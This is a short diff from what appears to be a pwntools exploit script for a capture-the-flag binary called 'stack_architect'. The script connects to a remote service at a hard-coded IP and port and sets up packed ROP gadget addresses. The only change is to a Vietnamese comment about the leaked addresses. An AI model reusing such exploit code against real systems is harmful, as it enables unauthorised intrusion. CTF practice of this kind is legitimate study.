@@ -3,7 +3,7 @@ sh=remote("45.122.249.68",10018)
 
 # sh = process("./stack_architect")
 
-# Địa chỉ leak được trong quá trình debug
+# Địa chỉ leak được trong quá trình debug và tìm Rop Gadget
 pop = p32(0x08049421) 
 a=p32(0x20010508)
 v=p32(0x8052001)
